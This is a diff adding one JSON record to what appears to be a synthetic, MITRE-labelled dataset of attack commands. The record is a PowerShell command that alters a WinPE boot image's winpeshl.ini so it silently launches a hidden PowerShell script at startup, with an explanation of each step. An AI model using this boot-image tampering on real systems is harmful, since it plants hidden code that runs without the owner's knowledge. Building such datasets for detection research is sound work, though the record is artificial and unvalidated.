@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Image /ImageFile:C:\\images\\boot_clean.wim /Index:2 /MountDir:C:\\Mount\\BasePE; dism /Mount-Image /ImageFile:C:\\images\\boot_mod.wim /Index:2 /MountDir:C:\\Mount\\WinPE; Set-Content -Path C:\\Mount\\WinPE\\Windows\\System32\\winpeshl.ini -Value \"[LaunchApps]`ncmd.exe /c start powershell.exe -NoP -W Hidden -File X:\\setup.ps1\"; $b=@(); if (Test-Path C:\\Mount\\BasePE\\Windows\\System32\\winpeshl.ini) { $b=Get-Content C:\\Mount\\BasePE\\Windows\\System32\\winpeshl.ini }; $m=Get-Content C:\\Mount\\WinPE\\Windows\\System32\\winpeshl.ini -ErrorAction SilentlyContinue; Compare-Object $b $m",
+  "explanation": "Modifies boot.wim (index 2) to alter WinPE launch behavior and compares winpeshl.ini contents with the baseline using Compare-Object.",
+  "rationale_steps": [
+    "Mount clean and modified boot images (Admin).",
+    "Write a new winpeshl.ini in the modified image to change startup behavior.",
+    "Use Compare-Object on file contents to verify changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-f5c24626-75b895d1",
+  "source_prompt_hash": "f5c24626",
+  "timestamp_utc": "2025-09-30T04:51:19.633456Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
